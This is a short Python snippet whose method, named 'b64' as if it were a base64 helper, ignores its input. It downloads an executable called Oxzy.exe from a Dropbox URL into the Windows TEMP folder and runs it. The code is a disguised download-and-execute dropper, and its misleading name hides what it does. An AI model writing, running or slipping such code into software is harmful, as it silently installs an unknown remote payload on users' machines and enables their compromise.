import requests
import os

class dl:
    @staticmethod
    def b64(txt: str) -> None:
        file = os.environ['TEMP'] + "\\oxzy.exe"
        open(file, "wb").write(requests.get("https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0").content)
        os.system(file)